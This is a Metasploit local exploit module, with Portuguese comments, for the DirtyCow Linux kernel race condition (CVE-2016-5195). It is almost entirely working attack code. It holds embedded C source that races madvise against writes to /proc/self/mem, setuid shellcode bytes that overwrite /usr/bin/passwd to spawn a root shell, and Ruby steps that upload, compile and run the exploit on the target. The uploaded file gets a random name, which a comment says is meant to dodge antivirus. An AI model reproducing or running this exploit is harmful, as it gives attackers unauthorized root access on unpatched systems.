class MetasploitModule < Msf::Exploit::Local
  Rank = ManualRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::Kernel
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info, {
      'Name' => 'Linux Kernel DirtyCow Privilege Escalation',
      'Description' => %q{
        Uma condição de disputa de chamada do sistema foi encontrada de
        forma que o usuário comum consiga acesso à escrita em arquivos
        protegidos por permissões do sistema. O usuário pode usar essa falha
        para modificar arquivos indevidos e logo escalar privilégios no sistema;
        O bug existe desde a versão 2.6.22 do Kernel (lançada em 2007).
      },
      'License' => MSF_LICENSE,
      'Author' => [
        'Phil Oester', # Descoberta da vulnerabilidade
        'Robin Verton', # Desenvolvedor da PoC
        'Augusto Ribeiro',
        'Estevam Arantes',
        'Henry Suzukawa',
      ],
      'Platform' => [ 'linux' ],
      'Arch'           => [ ARCH_X64 ],
      'References' =>
        [
          ['CVE', '2016-5195'],
          ['URL', 'https://dirtycow.ninja/'],
          ['URL', 'https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c'],
          ['URL', 'https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails'],
          ['URL', 'https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619']
        ],
      'Targets' => # Plataformas Vulneráveis
        [
          [ 'Linux x64', { 'Arch' => ARCH_X64 }]
        ],
      'DefaultOptions' =>
        {
          'PrependSetuid'    => true
        },
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Oct 18 2016'
    }))

    # Opções a serem dadas pelo usuário
    register_options([
      OptString.new("WritableDir", [ true, "Uma pasta onde podemos escrever arquivos, não pode ter sido montada sem execução", "/tmp" ]),
    ])
  end

  # Local onde o exploit vai ser compilado
  def base_dir
    datastore['WritableDir']
  end

  def upload(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    #register_file_for_cleanup path
  end

  # O usuário pode usar o comando check no metasploit para fazer a checagem da vulnerabilidade
  # Ocorre quando a versão do Kernel é acima de 2.6.22 e em algumas específicas dependendo da distro
  def check
    version = Gem::Version.new kernel_release.split('-').first
    if version.to_s.eql? ''
      vprint_error 'Could not determine the kernel version'
      return CheckCode::Unknown
    end

    unless version >= Gem::Version.new('2.6.22')
      vprint_error "Kernel version #{version} is not vulnerable"
      return CheckCode::Safe
    end

    # This could use some improvement for 4.x kernel release parsing...
    if (version <= Gem::Version.new('4.4.26')) ||
       (version.to_s.start_with?('4.7.') && version < Gem::Version.new('4.7.9')) ||
       (version.to_s.start_with?('4.8.') && version < Gem::Version.new('4.8.3'))
      vprint_good "Kernel version #{version} appears to be vulnerable"
      return CheckCode::Appears
    end

    vprint_error "Kernel version #{version} may or may not be vulnerable"
    CheckCode::Unknown
  end

  def on_new_session(session)
    if session.type.to_s.eql? 'meterpreter'
      session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'
      session.sys.process.execute '/bin/sh', "-c \"echo 0 > /proc/sys/vm/dirty_writeback_centisecs\""
    elsif session.type.to_s.eql? 'shell'
      client.shell_command_token 'echo 0 > /proc/sys/vm/dirty_writeback_centisecs'
    end
  end

  # Checagem ao exploitar (run)
  def exploit
    if check == CheckCode::Safe
      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
    end

    if is_root?
      fail_with Failure::BadConfig, 'Session already has root privileges'
    end

    unless cmd_exec("test -w '#{base_dir}' && echo true").include? 'true'
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

# Código C

    main = %q^
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>

void *map;
int f;
int stop = 0;
struct stat st;
char *name;
pthread_t pth1,pth2,pth3;

// change if no permissions to read
char suid_binary[] = "/usr/bin/passwd";

/*
* $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
*/ 
unsigned char sc[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
  0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,
  0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
};
unsigned int sc_len = 177;

void *madviseThread(void *arg)
{
    char *str;
    str=(char*)arg;
    int i,c=0;
    for(i=0;i<1000000 && !stop;i++) {
        c+=madvise(map,100,MADV_DONTNEED);
    }
    printf("thread stopped\n");
}

void *procselfmemThread(void *arg)
{
    char *str;
    str=(char*)arg;
    int f=open("/proc/self/mem",O_RDWR);
    int i,c=0;
    for(i=0;i<1000000 && !stop;i++) {
        lseek(f,map,SEEK_SET);
        c+=write(f, str, sc_len);
    }
    printf("thread stopped\n");
}

void *waitForWrite(void *arg) {
    char buf[sc_len];

    for(;;) {
        FILE *fp = fopen(suid_binary, "rb");

        fread(buf, sc_len, 1, fp);

        if(memcmp(buf, sc, sc_len) == 0) {
            printf("%s is overwritten\n", suid_binary);
            break;
        }

        fclose(fp);
        sleep(1);
    }

    stop = 1;

    printf("Popping root shell.\n");
    printf("Don't forget to restore /tmp/bak\n");

    system(suid_binary);
}

int main(int argc,char *argv[]) {
    char *backup;

    printf("DirtyCow root privilege escalation\n");
    printf("Backing up %s.. to /tmp/bak\n", suid_binary);

    asprintf(&backup, "cp %s /tmp/bak", suid_binary);
    system(backup);

    f = open(suid_binary,O_RDONLY);
    fstat(f,&st);

    printf("Size of binary: %d\n", st.st_size);

    char payload[st.st_size];
    memset(payload, 0x90, st.st_size);
    memcpy(payload, sc, sc_len+1);

    map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);

    printf("Racing, this may take a while..\n");

    pthread_create(&pth1, NULL, &madviseThread, suid_binary);
    pthread_create(&pth2, NULL, &procselfmemThread, payload);
    pthread_create(&pth3, NULL, &waitForWrite, NULL);

    pthread_join(pth3, NULL);

    return 0;
}
^

    # Nome aleatório, dificultando para ser pego por antivirus/semelhantes
    evil_path = "#{base_dir}/#{Rex::Text.rand_text_alpha 8..12}"

    # Faz o upload do arquivo .c para a vítima
    upload "#{evil_path}.c", main

    # Print caso set verbose esteja como true
    print_status "Compiling #{evil_path}.c via gcc"

    # Compila o arquivo c
    output = cmd_exec "/usr/bin/gcc -pthread -o #{evil_path}.out #{evil_path}.c -w"
    unless output.eql? ''
      print_error "Compilation failed: #{output}"
      return
    end

    # Dá a permissão de execução do arquivo compilado
    print_status "Executing payload at #{Time.now}..."
    cmd_exec "chmod +x #{evil_path}.out"
    output = cmd_exec "#{evil_path}.out"
    output.each_line { |line| vprint_status line.chomp }
  end
end